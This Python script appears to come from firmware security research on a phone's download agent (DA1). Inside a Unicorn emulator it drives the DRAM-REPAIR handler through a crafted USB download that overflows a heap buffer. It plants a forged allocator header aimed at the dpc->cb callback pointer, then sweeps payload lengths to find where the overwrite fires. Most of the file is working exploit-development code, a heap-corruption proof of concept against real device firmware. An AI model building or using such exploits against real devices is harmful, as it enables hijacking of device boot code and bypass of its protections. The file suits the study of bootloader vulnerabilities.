#!/usr/bin/env python3
"""Step 1 of docs/notes/uswi.handoff: sweep the declared download length for
``CMD:DEBUG:DRAM-REPAIR`` on DA1 200EX01 inside the Unicorn harness.

For every declared length ``L`` this script

* creates a *fresh* :class:`da1_emu.DA1Emu` and runs ``heap_init``;
* invokes the real handler at ``0x202C7C`` with a host-supplied command XML;
* answers the DA's ``CMD:DOWNLOAD-FILE`` handshake from Python (``emu.on_send``);
* advertises ``L``, gets ``malloc(L + 4)``, then delivers ``L + 0x10`` bytes:
  zeros plus the 12-byte fake allocator header
  ``{0xDEADBEEF, dpc_addr, 0xC0DE0001}`` at the next chunk boundary;
* records the heap geometry around the download buffer ``D`` and whether the
  chunk after it was freed (i.e. whether ``dpc->cb`` fired).

Protocol implemented (derived from the DA1 disassembly at
``fp_read_host_file`` 0x2500D8 and the notes in ``uswi.handoff`` section 3)::

    DA   -> host : CMD:DOWNLOAD-FILE <info>..</info><source_file>..</source_file>
    host -> DA   : "OK\\0"
    host -> DA   : "OK@0x<declared>\\0"
    DA   -> host : "OK\\0"                    (declared length accepted)
    loop per data chunk:
        host -> DA : "OK\\0"                  (chunk ack)
        DA   -> host : "OK\\0"
        host -> DA : <data slice, <= packet_length>
        DA   -> host : "OK\\0"
    (the DA leaves the loop only when the accumulated byte count == declared;
     the fake header makes the stream longer, so the final recv times out and
     the DA takes its ``0xC0010001`` error path)

For ``L + 0x10 > packet_length`` (only L >= 0x1ff0) the logical payload is
split into recv-sized slices; transfers that would land exactly on ``L`` are
shortened by one byte so the DA cannot take its success exit before the fake
header is delivered.

Usage::

    python docs/notes/da1_heap_sweep.py --image docs/notes/rmx3630-da2/da1_allinone.bin \
        --lo 0x40 --hi 0x400 --step 0x10
"""
from __future__ import annotations

import argparse
import json
import os
import re
import struct
import sys

from unicorn import (
    UC_HOOK_CODE, UC_HOOK_MEM_READ_UNMAPPED, UC_HOOK_MEM_WRITE_UNMAPPED,
    UC_HOOK_MEM_FETCH_UNMAPPED,
)
from unicorn.arm_const import UC_ARM_REG_PC, UC_ARM_REG_R0, UC_ARM_REG_LR

# Reuse the harness from the same directory (docs/notes).
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from da1_emu import (  # noqa: E402
    DA1Emu, SESSION, HEAP_INIT, DRAM_REPAIR, DPC_STRUCT, HEAP_HEAD,
    MALLOC, FREE,
)

# --- DA1 200EX01 constants (docs/notes/uswi.handoff section 2) -------------
PACKET_LEN_ADDR = 0x2DE3F8          # USB packet_length global used by recv
DEFAULT_PACKET_LEN = 0x2000
DPC_ADDR = DPC_STRUCT - 4           # 0x2DF79C: fake free-node address
DPC_CB_ADDR = DPC_STRUCT + 4        # 0x2DF7A4: node->size write target
FAKE_MAGIC = 0xDEADBEEF             # fake node[0] (linkA)
FAKE_SIZE = 0xC0DE0001              # fake node[8] (size) -> dpc->cb
CHUNK_HDR = 0xC                     # magic | node | size in front of a chunk
DOWNLOAD_MALLOC_LR = 0x250324       # return address of `bl malloc` in download
MALLOC_OK_RET = 0x204308            # malloc epilogue (r0 = user pointer)
MALLOC_FAIL_RET = 0x204260          # malloc failure epilogue (r0 = 0)
MALLOC_WALK = 0x204248              # malloc first-fit walk step
INSERT_WALK = 0x204400              # free-list insert walk step
RECV_LOOP = 0x250380               # download per-chunk recv loop head

CMD_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version>'
    b'<command>CMD:DEBUG:DRAM-REPAIR</command><arg>'
    b'<target_file>target</target_file>'
    # The handler downloads the node value of da/arg/param_file (string at
    # 0x255dc1); da/arg/target_file (0x2548e1) names the upload response.
    # <source_file> is kept only because the task contract names it.
    b'<param_file>param</param_file>'
    b'<source_file>param</source_file>'
    b'</arg></da>\x00'
)
XML_ADDR = 0x2BF000

# Instruction budget for pathological loops (hook fires on a few hot spots).
LOOP_BUDGET = 2_000_000


class _BudgetExceeded(Exception):
    pass


def _align4(value: int) -> int:
    return (value + 3) & ~3


def _hexint(text: str) -> int:
    return int(text, 0)


def _u32(emu: DA1Emu, addr: int):
    """Read u32, returning None for unmapped/invalid addresses."""
    try:
        return emu.read_u32(addr)
    except Exception:
        return None


def _safe_free_list(emu: DA1Emu, limit: int = 512):
    """Walk the free list defensively; the overflow can poison its links."""
    return _walk_free_uc(emu.uc, limit)


def _walk_free_uc(uc, limit: int = 512):
    out = []
    sentinel = HEAP_HEAD + 8
    try:
        # [head+8] is the last inserted node; the ascending chain starts at
        # [head+0xc] and is linked through node+4 (see insert @0x2043D8).
        node = struct.unpack("<I", uc.mem_read(HEAP_HEAD + 0xc, 4))[0]
    except Exception:
        return out
    seen = set()
    while node not in (None, 0, sentinel) and node not in seen and len(out) < limit:
        seen.add(node)
        try:
            size = struct.unpack("<I", uc.mem_read(node + 8, 4))[0]
            nxt = struct.unpack("<I", uc.mem_read(node + 4, 4))[0]
        except Exception:
            break
        out.append((node, size))
        node = nxt
    return out


class DownloadHost:
    """Host-side DA1 download responder built on ``emu.on_send``.

    The disassembled DRAM-REPAIR handler issues exactly one download
    (``da/arg/param_file``); ``da/arg/target_file`` is the name used by the
    later ``CMD:UPLOAD-FILE`` response (0x25057C), not a second download.  A
    second ``CMD:DOWNLOAD-FILE`` is nevertheless answered without overflow, so
    the responder stays correct if a different handler path requests one.
    """

    def __init__(self, emu: DA1Emu, declared_len: int,
                 packet_len: int = DEFAULT_PACKET_LEN,
                 second_len: int = 0x100):
        self.emu = emu
        self.declared_len = declared_len
        self.packet_len = packet_len
        self.second_len = second_len
        self.downloads = []
        self.current = None
        self.state = "idle"
        self.stream = b""
        self.pos = 0
        self.stream_offset = None    # stream offset of the fake header
        self.declared = 0

    # -- payload construction ------------------------------------------------
    def _make_payload(self, declared: int, overflow: bool):
        if not overflow:
            return b"\x00" * declared, None
        # malloc(declared+4) => chunk = align4(declared+0x10);
        # user capacity = chunk - 0xC; the fake header goes right there.
        capacity = _align4(declared + 0x10) - CHUNK_HDR
        stream_len = max(declared + 0x10, capacity + CHUNK_HDR)
        buf = bytearray(stream_len)
        hdr = struct.pack("<III", FAKE_MAGIC, DPC_ADDR, FAKE_SIZE)
        off = capacity
        buf[off:off + CHUNK_HDR] = hdr
        return bytes(buf), off

    # -- protocol state machine ---------------------------------------------
    def _queue(self, data: bytes):
        self.emu.rx.append(data)

    def _next_slice(self) -> bytes:
        remaining = len(self.stream) - self.pos
        n = min(remaining, self.packet_len)
        # The DA exits the loop when accumulated == declared.  Keep any
        # intermediate transfer from landing exactly on that boundary (which
        # would end the download before the overflow header is delivered).
        if self.pos + n == self.declared and remaining > n:
            n -= 1
        data = self.stream[self.pos:self.pos + n]
        self.pos += n
        if self.current is not None:
            self.current["delivered_bytes"] = self.pos
        return data

    def on_send(self, data: bytes):
        text = bytes(data).rstrip(b"\x00")
        if b"CMD:DOWNLOAD-FILE" in text:
            self._on_download_request(text)
        elif text == b"OK" and self.state != "idle":
            self._on_da_ok()

    def _on_download_request(self, text: bytes):
        def field(name):
            m = re.search(rb"<%s>(.*?)</%s>" % (name, name), text, re.S)
            return m.group(1).decode("ascii", "replace") if m else None

        first = not self.downloads
        declared = self.declared_len if first else self.second_len
        overflow = first
        stream, off = self._make_payload(declared, overflow)
        self.declared = declared
        self.stream = stream
        self.pos = 0
        self.stream_offset = off
        self.downloads.append({
            "source_file": field(b"source_file"),
            "info": field(b"info"),
            "packet_length": field(b"packet_length"),
            "declared": declared,
            "overflow": overflow,
            "stream_len": len(stream),
            "fake_header_offset": off,
            "delivered_bytes": 0,
            "delivered_full": len(stream) == 0,
        })
        self.current = self.downloads[-1]
        self.state = "await_len_ok"
        self._queue(b"OK\x00")
        self._queue(b"OK@0x%x\x00" % declared)

    def _on_da_ok(self):
        if self.state == "await_len_ok":
            # DA accepted the declared length; it now waits for a chunk ack.
            self._queue(b"OK\x00")
            self.state = "await_data_ok"
        elif self.state == "await_data_ok":
            # DA is ready for data (it has just sent its OK).
            self._queue(self._next_slice())
            self.state = "await_chunk_ok"
        elif self.state == "await_chunk_ok":
            if self.pos < len(self.stream):
                self._queue(b"OK\x00")
                self.state = "await_data_ok"
            else:
                # Overflow run: stay silent -> next recv times out.
                # Exact-length run: the DA already left the loop.
                if self.current is not None:
                    self.current["delivered_full"] = True
                self.state = "done"


class SweepRun:
    """One fresh-emulator run for a single declared length."""

    def __init__(self, image: str, declared_len: int,
                 packet_len: int = DEFAULT_PACKET_LEN,
                 second_len: int = 0x100):
        self.L = declared_len
        self.image = image
        self.packet_len = packet_len
        self.second_len = second_len
        self.allocs = []            # (request, ptr, lr, chunk_size)
        self.frees = []             # user pointers passed to free()
        self.unmapped = []          # (rw, addr)
        self.dl_snapshot = None     # download buffer + free list at alloc time
        self.loop_hits = 0
        self.budget_hit = False
        self.rc = None
        self.returned = False

    def _install_hooks(self, emu: DA1Emu):
        gate = {}

        def on_malloc_entry(uc, address, size, ud):
            gate["request"] = uc.reg_read(UC_ARM_REG_R0)
            gate["lr"] = uc.reg_read(UC_ARM_REG_LR)

        def on_malloc_ret(uc, address, size, ud):
            if "request" in gate:
                request = gate.pop("request")
                lr = gate.pop("lr", 0)
                ptr = uc.reg_read(UC_ARM_REG_R0)
                chunk = None
                if ptr:
                    try:
                        chunk = struct.unpack(
                            "<I", uc.mem_read(ptr - 4, 4))[0]
                    except Exception:
                        chunk = None
                self.allocs.append((request, ptr, lr, chunk))
                if lr == DOWNLOAD_MALLOC_LR and ptr and \
                        self.dl_snapshot is None:
                    # Snapshot the geometry while the buffer is still live:
                    # on a successful download the handler frees it later.
                    self.dl_snapshot = {"D": ptr, "chunk": chunk,
                                        "free": _walk_free_uc(uc)}
                gate.clear()

        def on_malloc_fail(uc, address, size, ud):
            if "request" in gate:
                self.allocs.append((gate.pop("request"), 0,
                                    gate.pop("lr", 0), None))
                gate.clear()

        def on_free(uc, address, size, ud):
            self.frees.append(uc.reg_read(UC_ARM_REG_R0))

        def on_walk(uc, address, size, ud):
            self.loop_hits += 1
            if self.loop_hits > LOOP_BUDGET:
                self.budget_hit = True
                raise _BudgetExceeded()

        def on_unmapped_read(uc, access, address, size, value, ud):
            self.unmapped.append(("r", address))
            return True

        def on_unmapped_write(uc, access, address, size, value, ud):
            self.unmapped.append(("w", address))
            return True

        def on_unmapped_fetch(uc, access, address, size, value, ud):
            self.unmapped.append(("x", address))
            return True

        emu.uc.hook_add(UC_HOOK_CODE, on_malloc_entry, begin=MALLOC, end=MALLOC)
        emu.uc.hook_add(UC_HOOK_CODE, on_malloc_ret,
                        begin=MALLOC_OK_RET, end=MALLOC_OK_RET)
        emu.uc.hook_add(UC_HOOK_CODE, on_malloc_fail,
                        begin=MALLOC_FAIL_RET, end=MALLOC_FAIL_RET)
        emu.uc.hook_add(UC_HOOK_CODE, on_free, begin=FREE, end=FREE)
        for addr in (MALLOC_WALK, INSERT_WALK, RECV_LOOP):
            emu.uc.hook_add(UC_HOOK_CODE, on_walk, begin=addr, end=addr)
        emu.uc.hook_add(UC_HOOK_MEM_READ_UNMAPPED, on_unmapped_read)
        emu.uc.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED, on_unmapped_write)
        emu.uc.hook_add(UC_HOOK_MEM_FETCH_UNMAPPED, on_unmapped_fetch)

    def run(self) -> dict:
        emu = DA1Emu(self.image, verbose=False)
        self._install_hooks(emu)
        # Capture the harness' own "[emu] stop: ..." diagnostic while keeping
        # normal logging off.
        emu_logs = []
        emu.log = lambda *a: (emu_logs.append(" ".join(str(x) for x in a))
                              if any("stop" in str(x) for x in a) else None)

        emu.call(HEAP_INIT)
        heap = emu.heap_state()
        emu.write_bytes(PACKET_LEN_ADDR, struct.pack("<I", self.packet_len))

        host = DownloadHost(emu, self.L, self.packet_len, self.second_len)
        emu.on_send = host.on_send
        emu.write_bytes(XML_ADDR, CMD_XML)

        self.rc = emu.call(DRAM_REPAIR, [SESSION, XML_ADDR])
        self.returned = bool(getattr(emu, "_ret", False))
        try:
            pc_at_stop = emu.uc.reg_read(UC_ARM_REG_PC)
        except Exception:
            pc_at_stop = None

        allocs = [{"request": r, "ptr": p, "lr": lr, "chunk": ch}
                  for r, p, lr, ch in self.allocs]
        dl_reqs = [a for a in allocs if a["lr"] == DOWNLOAD_MALLOC_LR]
        dl_allocs = [a for a in dl_reqs if a["ptr"]]
        d_buf = dl_allocs[0]["ptr"] if dl_allocs else None
        snap = self.dl_snapshot or {}
        first_dl = host.downloads[0] if host.downloads else {}
        rec_poisoned = bool(first_dl.get("overflow")
                            and first_dl.get("fake_header_offset") is not None
                            and first_dl.get("delivered_full"))

        rec = {
            "L": self.L,
            "L_hex": hex(self.L),
            "malloc_request": dl_reqs[0]["request"] if dl_reqs else None,
            "D": d_buf,
            "D_hex": hex(d_buf) if d_buf else None,
            "chunk_size": None,
            "capacity": None,
            "next": None,
            "next_hex": None,
            "next_class": "none",
            "next_free_size": None,
            "next_alloc_request": None,
            "free_next_called": False,
            "free_next_user": None,
            "dpc_cb": None,
            "dpc_cb_hex": None,
            "handler_rc": self.rc,
            "handler_rc_hex": hex(self.rc & 0xFFFFFFFF)
            if isinstance(self.rc, int) else None,
            "stop": self._stop_reason(),
            "stop_detail": " | ".join(emu_logs) or None,
            "pc_at_stop": hex(pc_at_stop) if pc_at_stop is not None else None,
            "budget_hit": self.budget_hit,
            "heap_base": heap.get("base"),
            "heap_size": heap.get("size"),
            "allocs": allocs,
            "download_allocs": dl_allocs,
            "downloads": host.downloads,
            "frees": self.frees[:64],
            "frees_total": len(self.frees),
            "unmapped": self.unmapped[:32],
            "unmapped_total": len(self.unmapped),
            "first_free_after": None,
            "free_list_at_alloc": None,
            "poisoned": rec_poisoned,
            "fake_linka_after": None,
            "populated_by_insert": False,
            "verdict": "unknown",
        }

        if d_buf:
            chunk = snap.get("chunk")
            if chunk is None:
                chunk = _u32(emu, d_buf - 4)
            rec["chunk_size"] = chunk
            cap = (chunk - CHUNK_HDR) if chunk is not None else None
            rec["capacity"] = cap
            if cap is not None:
                nxt = d_buf + cap
                rec["next"] = nxt
                rec["next_hex"] = hex(nxt)
                self._classify(emu, rec, nxt, cap,
                               snap.get("free"))
                rec["fake_linka_after"] = _u32(emu, nxt)
                rec["populated_by_insert"] = (
                    rec_poisoned
                    and rec["fake_linka_after"] is not None
                    and rec["fake_linka_after"] != FAKE_MAGIC)

        free_after = _safe_free_list(emu)
        if free_after:
            rec["first_free_after"] = {"addr": free_after[0][0],
                                       "size": free_after[0][1]}
        cb = _u32(emu, DPC_CB_ADDR)
        rec["dpc_cb"] = cb
        rec["dpc_cb_hex"] = hex(cb) if cb is not None else None
        rec["verdict"] = self._verdict(rec)
        rec["emu"] = emu
        return rec

    def _classify(self, emu: DA1Emu, rec: dict, nxt: int, cap: int,
                  free_snapshot=None):
        base = rec["heap_base"] or 0
        size = rec["heap_size"] or 0
        free_nodes = free_snapshot if free_snapshot is not None \
            else _safe_free_list(emu)
        victim_user = nxt + CHUNK_HDR
        rec["free_next_user"] = victim_user
        exact = [n for n in free_nodes if n[0] == nxt]
        if not (base <= nxt < base + size):
            rec["next_class"] = "tail-or-unmapped"
        elif exact:
            rec["next_class"] = "free"
            rec["next_free_size"] = exact[0][1]
        else:
            allocated = [a for a in rec["allocs"]
                         if a["ptr"] == victim_user]
            if allocated:
                rec["next_class"] = "allocated"
                rec["next_alloc_request"] = allocated[0]["request"]
            else:
                # Not a free-node start and not an allocated chunk header:
                # it is the body of a free node (free-list corruption target).
                body = [n for n in free_nodes
                        if n[0] <= nxt < n[0] + (n[1] or 0)]
                rec["next_class"] = "free-body" if body else "unknown"
        # free() is called with the *user* pointer, i.e. header + 0xC.
        rec["free_next_called"] = (victim_user in self.frees
                                   or nxt in self.frees)
        rec["free_list_at_alloc"] = [
            {"addr": a, "size": s} for a, s in free_nodes]

    def _stop_reason(self) -> str:
        if self.budget_hit:
            return "budget"
        if self.rc == -1 and not self.returned:
            return "exception"
        if self.returned:
            return "returned"
        return "call-limit"

    def _verdict(self, rec: dict) -> str:
        if rec["D"] is None:
            return "malloc-failed"
        if rec["budget_hit"]:
            return "crash (loop budget)"
        if rec["dpc_cb"] == FAKE_SIZE and rec["free_next_called"]:
            return "FIRE dpc->cb=0xC0DE0001"
        if rec["stop"] == "exception":
            if rec["next_class"] == "free" and rec["populated_by_insert"]:
                return (f"crash at {rec['pc_at_stop']} (unlink writes "
                        f"{FAKE_MAGIC + 4:#x}); no fire")
            return "crash (exception)"
        if rec["next_class"] == "free":
            if rec["populated_by_insert"]:
                return ("crash on HW (unlink writes [0xDEADBEEF+4]); "
                        "no fire in emu")
            return "no fire (poisoned free node untouched)"
        if rec["next_class"] in ("tail-or-unmapped", "none"):
            return "no fire (no next chunk)"
        return "no fire (DA alive)"


def sweep(image: str, lo: int, hi: int, step: int,
          packet_len: int, second_len: int) -> list:
    results = []
    length = lo
    while length <= hi:
        run = SweepRun(image, length, packet_len, second_len)
        rec = run.run()
        rec.pop("emu", None)
        results.append(rec)
        length += step
    return results


def _fmt_lengths(values, step: int) -> str:
    vals = sorted(values)
    if not vals:
        return "-"
    if len(vals) >= 4:
        diffs = {b - a for a, b in zip(vals, vals[1:])}
        if len(diffs) == 1:
            d = diffs.pop()
            return f"0x{vals[0]:x}..0x{vals[-1]:x} step 0x{d:x}"
    return _range_text(vals)


def _range_text(values) -> str:
    vals = sorted(values)
    if not vals:
        return "-"
    parts = []
    start = prev = vals[0]
    for v in vals[1:]:
        if v == prev + 1:
            prev = v
            continue
        parts.append(f"0x{start:x}" if start == prev
                     else f"0x{start:x}-0x{prev:x}")
        start = prev = v
    parts.append(f"0x{start:x}" if start == prev else f"0x{start:x}-0x{prev:x}")
    return ",".join(parts)


def _hex_span(values) -> str:
    vals = [v for v in values if v is not None]
    if not vals:
        return "-"
    lo, hi = min(vals), max(vals)
    return f"0x{lo:x}" if lo == hi else f"0x{lo:x}-0x{hi:x}"


def print_table(results: list, step: int = 0x10):
    # Dedupe by outcome-relevant geometry: every L has its own chunk size by
    # construction (chunk = align4(L+0x10)), so the size columns are shown as
    # ranges within a class instead of exploding into one row per L.
    key_fields = ("D_hex", "next_class", "free_next_called", "dpc_cb_hex",
                  "handler_rc_hex", "stop", "verdict")
    groups = {}
    for rec in results:
        key = tuple(rec[f] for f in key_fields)
        groups.setdefault(key, []).append(rec)

    headers = ("L", "D", "chunk", "cap", "next", "next class", "free(next)",
               "dpc->cb", "rc", "stop", "verdict")
    rows = []
    for recs in groups.values():
        r = recs[0]
        rows.append((
            _fmt_lengths([x["L"] for x in recs], step),
            _hex_span([x["D"] for x in recs]),
            _hex_span([x["chunk_size"] for x in recs]),
            _hex_span([x["capacity"] for x in recs]),
            _hex_span([x["next"] for x in recs]),
            r["next_class"] + (f"({hex(r['next_free_size'])})"
                               if r["next_free_size"] is not None else ""),
            "yes" if r["free_next_called"] else "no",
            r["dpc_cb_hex"] or "-",
            r["handler_rc_hex"] or "-",
            r["stop"],
            r["verdict"],
        ))
    widths = [max(len(str(row[i])) for row in rows + [headers])
              for i in range(len(headers))]
    line = "  ".join(h.ljust(w) for h, w in zip(headers, widths))
    print(line)
    print("  ".join("-" * w for w in widths))
    for row in rows:
        print("  ".join(str(v).ljust(w) for v, w in zip(row, widths)))
    print(f"\n{len(results)} runs, {len(groups)} distinct geometry classes")


def main(argv=None) -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    ap = argparse.ArgumentParser(
        description="Sweep declared download length for DA1 DRAM-REPAIR")
    ap.add_argument("--image",
                    default=os.path.join(here, "rmx3630-da2",
                                         "da1_allinone.bin"),
                    help="DA1 image (file offset 0 == VA 0x200000)")
    ap.add_argument("--lo", type=_hexint, default=0x40)
    ap.add_argument("--hi", type=_hexint, default=0x4000)
    ap.add_argument("--step", type=_hexint, default=0x10)
    ap.add_argument("--packet-len", type=_hexint, default=DEFAULT_PACKET_LEN,
                    help="USB packet_length global (default 0x2000)")
    ap.add_argument("--second-len", type=_hexint, default=0x100,
                    help="declared length for a second download, if reached")
    ap.add_argument("--json",
                    default=os.path.join(here, "da1_sweep_results.json"),
                    help="full per-L JSON output")
    args = ap.parse_args(argv)

    if args.step <= 0:
        ap.error("--step must be positive")
    if args.hi < args.lo:
        ap.error("--hi must be >= --lo")
    if not os.path.isfile(args.image):
        ap.error(f"image not found: {args.image}")

    print(f"image     : {args.image}")
    print(f"sweep     : L=0x{args.lo:x}..0x{args.hi:x} step 0x{args.step:x}")
    print(f"packet_len: 0x{args.packet_len:x}  second_len: "
          f"0x{args.second_len:x}\n")

    results = sweep(args.image, args.lo, args.hi, args.step,
                    args.packet_len, args.second_len)
    print_table(results, args.step)

    out = {
        "image": os.path.abspath(args.image),
        "lo": args.lo, "hi": args.hi, "step": args.step,
        "packet_len": args.packet_len, "second_len": args.second_len,
        "fake_header": {"magic": hex(FAKE_MAGIC),
                        "node": hex(DPC_ADDR),
                        "size": hex(FAKE_SIZE)},
        "results": results,
    }
    with open(args.json, "w") as f:
        json.dump(out, f, indent=1)
    print(f"json      : {args.json}")

    fired = [r["L"] for r in results
             if r["dpc_cb"] == FAKE_SIZE and r["free_next_called"]]
    print(f"fired     : {_range_text(fired)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
